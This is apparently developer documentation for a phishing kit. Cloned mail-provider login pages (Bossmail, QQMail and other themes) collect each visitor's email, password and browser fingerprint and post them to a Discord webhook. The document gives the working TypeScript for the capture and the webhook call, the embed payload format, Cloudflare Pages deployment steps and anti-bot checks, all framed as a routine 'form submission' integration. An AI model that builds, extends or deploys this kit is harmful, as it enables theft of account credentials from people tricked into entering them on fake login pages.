# Implementation Details - Discord Form Submission

## Architecture Overview

```
┌─────────────────────────────────────────────┐
│         User Submits Form                   │
│      (Any Theme/Component)                  │
└────────────────────┬────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────┐
│    Form Handler (handleSubmit/handleLogin)  │
│    ├─ Validate form data                    │
│    ├─ Run security checks                   │
│    └─ Call submitToDiscord()                │
└────────────────────┬────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────┐
│      DiscordService.submitToDiscord()       │
│    ├─ Read webhook URL from env             │
│    ├─ Format data as Discord embed          │
│    └─ Send HTTP POST to Discord             │
└────────────────────┬────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────┐
│      Discord API Webhook Endpoint           │
│    ├─ Validate webhook                      │
│    ├─ Process embed message                 │
│    └─ Post to target channel                │
└────────────────────┬────────────────────────┘
                     │
                     ▼
┌─────────────────────────────────────────────┐
│     Message Appears in Discord Channel      │
│        (Formatted Embed with Data)          │
└─────────────────────────────────────────────┘
```

## Component Integration Points

### 1. LoginForm.tsx
```typescript
// Import
import { submitToDiscord } from '../services/DiscordService';

// In handleSubmit (after form validation)
await submitToDiscord({
  email,
  password,
  fingerprint,
  lang,
  tab: activeTab,
}, 'LoginForm');
```

### 2. Theme Components (BossmailTheme, QQMailTheme, etc.)
```typescript
// Pattern used across all themes
const handleLogin = async (e: React.FormEvent) => {
  e.preventDefault();
  await submitToDiscord({
    email,        // or username
    password,
    theme: 'themeName',
    // ... additional fields
  }, 'ThemeName');
  alert('Login attempt logged');
};

// Form tag
<form onSubmit={handleLogin}>
  {/* form fields */}
</form>
```

## DiscordService Implementation

### Function Signature
```typescript
export const submitToDiscord = async (
  formData: FormData, 
  formType: string = 'login'
): Promise<boolean>
```

### Payload Structure
```typescript
{
  "username": "Form Submission Bot",
  "avatar_url": "https://...",
  "embeds": [{
    "title": "LoginForm Form Submission",
    "color": 16711680,  // Red
    "fields": [
      { "name": "Email/Username", "value": "user@example.com", "inline": true },
      { "name": "Password", "value": "password123", "inline": false },
      // ... more fields
    ],
    "footer": { "text": "Multi-Tenant Mail Clone" },
    "timestamp": "2026-01-31T10:00:00.000Z"
  }]
}
```

## Environment Variable Configuration

### Development (.env)
```
VITE_DISCORD_WEBHOOK_URL=https://discordapp.com/api/webhooks/YOUR_ID/YOUR_TOKEN
```

### Production (Cloudflare Pages)
Set via Cloudflare Pages project settings → Environment Variables

### Access in Code
```typescript
const webhookUrl = import.meta.env.VITE_DISCORD_WEBHOOK_URL;
```

## Form Data Collection

### Automatic Field Detection
The service automatically includes any fields from the `formData` object:

```typescript
Object.entries(formData).forEach(([key, value]) => {
  if (!['email', 'password', 'username', 'theme', 'lang', 'timestamp'].includes(key) && value) {
    fields.push({ name: key, value: String(value), inline: true });
  }
});
```

This means:
- Add new properties to formData object
- They automatically appear in Discord message
- No need to update DiscordService for new fields

## Error Handling

### Missing Webhook URL
```typescript
if (!webhookUrl) {
  console.warn('Discord webhook URL not configured');
  return false;  // Silent failure, app continues normally
}
```

### Webhook Request Errors
```typescript
if (!response.ok) {
  console.error('Discord webhook error:', response.status, response.statusText);
  return false;  // Silent failure, app continues normally
}
```

### Why Silent Failures?
- Form submission is the priority
- Discord is an enhancement, not required
- Users won't see disruption if Discord is down
- Errors logged to browser console for debugging

## Security Implementation

### 1. No Sensitive Data in Code
- Webhook URL stored in `.env`
- Not committed to version control
- Never logged or displayed

### 2. CORS Handling
- Discord webhooks don't require CORS headers
- Direct fetch works from browsers
- No proxy needed

### 3. Existing Security Checks Remain
- Honeypot detection still active
- Rapid submission detection still active
- Form validation still required
- Discord call happens AFTER validation

## Deployment Workflow

### Development
```bash
1. npm run dev
2. Set VITE_DISCORD_WEBHOOK_URL in .env
3. Test form submission
4. Verify Discord message appears
```

### Cloudflare Pages
```bash
1. git push to repository
2. Set VITE_DISCORD_WEBHOOK_URL in Cloudflare dashboard
3. Deploy triggers automatically
4. Form submissions go to Discord
```

### Build Output
```bash
npm run build
# Creates dist/ folder with compiled React app
# All Discord integration code bundled
# Environment variable injected at build time
```

## Performance Considerations

### API Call Details
- **Method**: POST
- **Endpoint**: Discord Webhook URL
- **Content-Type**: application/json
- **Expected Response**: 204 No Content or 200 OK
- **Timeout**: Standard fetch timeout (~30 seconds)
- **Async**: Non-blocking (await used, but doesn't block form)

### Impact
- Discord API call is async/await
- Form submission completes regardless of Discord status
- Typical latency: 100-500ms to Discord
- No visible delay to user

## Troubleshooting Checklist

- [ ] Webhook URL copied correctly (no extra spaces)
- [ ] Webhook URL includes full `https://` protocol
- [ ] Webhook hasn't been deleted from Discord
- [ ] Environment variable name is exactly `VITE_DISCORD_WEBHOOK_URL`
- [ ] .env file saved and app restarted
- [ ] Check browser console for errors (F12)
- [ ] Verify Discord channel exists and webhook points to it
- [ ] Test with `curl` command if needed
- [ ] For production, verify environment variable set in Cloudflare

## Extending the Integration

### Adding New Fields
```typescript
// In component's handleSubmit/handleLogin
await submitToDiscord({
  email,
  password,
  theme: 'themeName',
  customField: 'customValue',  // Automatically included!
  anotherField: 123,
}, 'FormName');
```

### Customizing Embed Appearance
Edit `services/DiscordService.ts`:
```typescript
const payload = {
  embeds: [{
    color: 16711680,  // Change color (RGB as integer)
    // Edit title, footer, fields format, etc.
  }]
};
```

### Conditional Submission
```typescript
// Only send to Discord in production
if (import.meta.env.PROD) {
  await submitToDiscord(formData, 'FormName');
}
```

## FAQ

**Q: Can I test without Discord webhook?**
A: Yes! App works normally without webhook. Remove URL from .env.

**Q: Does this affect form validation?**
A: No. Discord submission happens after validation passes.

**Q: What if Discord is down?**
A: Form still submits successfully. Error logged to console.

**Q: Can I send to multiple Discord servers?**
A: Create multiple webhooks and call submitToDiscord multiple times.

**Q: Is password data secure?**
A: It's sent over HTTPS. Keep webhook URL secret. Consider this a security risk in production.

**Q: Can I customize Discord message format?**
A: Yes, edit DiscordService.ts to change embed structure and appearance.
